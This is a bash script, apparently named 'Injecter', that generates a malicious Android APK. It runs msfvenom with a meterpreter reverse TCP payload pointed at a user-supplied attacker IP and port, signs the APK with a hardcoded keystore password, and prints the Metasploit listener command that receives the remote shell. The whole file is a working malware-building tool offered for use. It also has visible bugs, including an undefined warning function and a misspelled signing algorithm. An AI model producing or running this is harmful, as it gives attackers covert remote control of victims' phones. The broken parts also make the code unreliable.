#!/bin/bash
# GitHub: https://github.com/zerotrace-hub/Injecter.git

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

display_banner() {
    clear
    echo -e "${RED}"
    cat << "EOF"
    ╔═══════════════════════════════════════╗
    ║                                       ║
    ║      ###    INJECTER     ###          ║
    ║     Android Payload genrater          ║
    ║            __________                 ║
    ╚═══════════════════════════════════════╝
EOF
    echo -e "${NC}"
    echo -e "${GREEN}GitHub: https://github.com/zerotrace-hub/Injecter.git${NC}"
    echo ""
}

show_message() {
    echo -e "${BLUE}[*]${NC} $1"
}

show_success() {
    echo -e "${GREEN}[+]${NC} $1"
}

show_error() {
    echo -e "${RED}[-]${NC} $1"
}

validate_ip() {
    local ip=$1
    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        IFS='.' read -r i1 i2 i3 i4 <<< "$ip"
        if [[ $i1 -le 255 && $i2 -le 255 && $i3 -le 255 && $i4 -le 255 ]]; then
            return 0
        fi
    fi
    return 1
}

validate_port() {
    local port=$1
    if [[ $port =~ ^[0-9]+$ ]] && [ $port -ge 1 ] && [ $port -le 65535 ]; then
        return 0
    fi
    return 1
}

check_dependencies() {
    if ! command -v msfvenom &> /dev/null; then
        show_error "msfvenom not found. Run ./setup.sh first."
        exit 1
    fi
    
    if ! command -v java &> /dev/null; then
        show_error "Java not found. Run ./setup.sh first."
        exit 1
    fi
    
    if ! command -v apktool &> /dev/null; then
        show_warning "APKTool not found (optional for APK injection)"
    fi
}

create_payload() {
    local lhost=$1
    local lport=$2
    
    show_message "Creating payload..."
    
    local output_file="injecter_payload_$(date +%s).apk"
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o "$output_file"
    
    if [ ! -f "$output_file" ]; then
        show_error "Failed to create payload"
        return 1
    fi
    
    # Sign APK
    show_message "Signing APK..."
    
    if [ ! -f "injecter.keystore" ]; then
        keytool -genkey -v -keystore injecter.keystore \
            -alias injecter_key \
            -keyalg RSA -keysize 2048 \
            -validity 10000 \
            -storepass injecter123 \
            -keypass injecter123 \
            -dname "CN=Injecter" 2>/dev/null
    fi
    
    jarsigner -verbose -sigalg SHA1withRRA -digestalg SHA1 \
        -keystore injecter.keystore \
        -storepass injecter123 \
        -keypass injecter123 \
        "$output_file" injecter_key 2>/dev/null
    
    show_success "Payload created: $output_file"
    echo "$output_file"
}

main() {
    display_banner
    
    show_message "Checking dependencies..."
    check_dependencies
    
    # Get LHOST
    echo ""
    show_message "Enter payload configuration:"
    echo ""
    
    while true; do
        read -p "$(echo -e ${CYAN}"LHOST (your IP): "${NC})" LHOST
        
        if validate_ip "$LHOST"; then
            break
        else
            show_error "Invalid IP"
        fi
    done
    
    # Get LPORT
    while true; do
        read -p "$(echo -e ${CYAN}"LPORT [4444]: "${NC})" LPORT
        LPORT=${LPORT:-4444}
        
        if validate_port "$LPORT"; then
            break
        else
            show_error "Invalid port"
        fi
    done
    
    # Create payload
    OUTPUT_FILE=$(create_payload "$LHOST" "$LPORT")
    
    if [ ! -z "$OUTPUT_FILE" ]; then
        echo ""
        echo -e "${GREEN}════════════════════════════════════════════════${NC}"
        echo -e "${WHITE}             #  INJECTER COMPLETE  #            ${NC}"
        echo -e "${GREEN}════════════════════════════════════════════════${NC}"
        echo ""
        echo -e "${CYAN}Payload:${NC} $OUTPUT_FILE"
        echo -e "${CYAN}LHOST:${NC} $LHOST"
        echo -e "${CYAN}LPORT:${NC} $LPORT"
        echo ""
        echo -e "${YELLOW}Listener Command:${NC}"
        echo "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT $LPORT; exploit\""
        echo ""
        echo -e "${BLUE}GitHub:${NC} https://github.com/zerotrace-hub/Injecter.git"
        echo ""
    fi
}

# Start
main